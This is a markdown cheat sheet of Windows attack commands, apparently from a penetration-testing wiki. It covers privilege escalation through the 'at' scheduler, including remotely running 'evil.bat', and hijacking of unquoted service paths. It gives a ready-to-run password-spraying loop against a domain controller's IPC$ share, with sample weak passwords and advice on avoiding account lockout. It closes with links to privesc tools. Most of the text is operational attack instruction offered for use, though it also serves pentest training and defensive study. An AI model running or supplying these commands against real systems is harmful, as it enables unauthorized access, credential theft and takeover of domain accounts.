# Windows Privilege Escalation Commands

Command that can be executed from the context of a shell prompt that help escalate or increase attacker privilege of the target.

  * [UAC](uac.md) - How to bypass UAC.

# General Commands
### at (Scheduler)
 * **Command with arguments**: `at [TIME] [cmd]`
 * **Description**: This command can be used locally to escalate privilege to SYSTEM or be used across a network to execute commands on another system.
 * **Examples**: 
    * Locally - `at 13:20 /interactive cmd`
    * Remotely - From http://www.slideshare.net/mubix/windows-attacks-at-is-the-new-black-26665607
         * `net use \\[computername|IP] /user:DOMAIN\username password`
         * `net time \\[computername|IP]`
         * `at \\[computername|IP] 13:20 c:\temp\evil.bat`

# Service security

### Unquoted service names

Services with unquoted binary paths may allow privilege escalation.

 * Assume ServiceA refers to the unquoted path C:\Program Files\Some Service\service.exe
 * Service is started with desirable privileges (e.g. domain, SYSTEM)
 * If attacker can create files as c:\Program.exe or ''c:\Program Files\Some.bat'' the next time the service starts the attacker controlled binary will execute
   * This is because the system can not decide if a space in the command string indicates a space in the binary path or a separator between command line arguments. The system starts with the first substring before the first space and checks if there is a file with an executable extension there (in this case C:\Program.exe, C:\Program.bat, etc.). If there is not, it checks for the next substring (C:\Program Files\Some.exe, C:\Program Files\Some.bat, etc.) and so on. If you can create a file that is checked before the intended executable, you win.
   * The scenario is typical when services are created from the command line with sc: `sc create PrivEsc binpath= "..."`

# Password Spraying

This section taken from Skoudis / Strand Pillage the Village redux webcast

### Get a list of users from the domain
 * **Command with arguments**: `net user /domain`
 * **Description**: This command will pull a list of all domain user accounts
 * **Examples**: 
    * Locally - `net user /domain > users`

### Simple `for` loop to try one or two passwords across all the users on the domain
 * **Command with arguments**: `@FOR /F %n in (users.txt) DO @FOR /F %p in (pass.txt) DO @net use \\[DOMAINCONTROLLER]\IPC$ /user:[DOMAIN]\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use / delete \\[DOMAINCONTROLLER]\IPC$ > NUL`
 * **Formatted for readability:
```
@FOR /F %n in (users.txt) DO
 @FOR / F %p in (pass.txt) DO
  @net use \\[DOMAINCONTROLLER]\IPC$ /user:[DOMAIN]\%n %p 1>NUL 2>&1 &&
   @echo [*] %n:%p &&
    @net use / delete \\[DOMAINCONTROLLER]IPC$ > NULL
```
 * **Description**: a for loop that iterated over all the users in `users.txt` and tries all the passwords listed in `pass.txt`. Can be used with the `net user /domain` command listed above for every user in the domain.
 *  **Note**: To prevent account lockout, the amount of passwords in `pass.txt` should be kept very small--one or two at most.
 * **Examples**: 
  * Running this command against a domain `COMPANY` and a domain controller `COMPANYDC1`
       * `net user /domain > DomainUsers.txt`
        * `echo "Password1" >> pass.txt`
        * `echo "1q2w3e4r" >> pass.txt`
        * `@FOR /F %n in (DomainUsers.txt) DO @FOR /F %p in (pass.txt) DO @net use \\COMPANYDC1\IPC$ /user:COMPANY\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use / delete \\COMPANYDC1\IPC$ > NUL`

# Tools

* [Windows Privesc Check](https://code.google.com/p/windows-privesc-check/)
  * Python + PyInstaller
  * No unicode support ([attempt to fix this](https://github.com/silentsignal/wpc))
  * Awful code base
* [Windows Privesc Check 2.0](https://github.com/silentsignal/wpc/tree/wpc-2.0)
  * Python + PyInstaller
  * Code is still very hard to maintain
  * Still painful to use on non-English systems
* [PowerUp](https://github.com/HarmJ0y/PowerUp)
  * Smart PowerShell cmdlets (you can run these at remote hosts also!)
  * Offensive approach
  * Checks only the privileges of the executing user
* [WPC-PS](https://github.com/silentsignal/wpc-ps)
  * PowerShell
  * Tends to check privileges for all accounts (thus identifying potential targets for privesc)
  * Still experimental

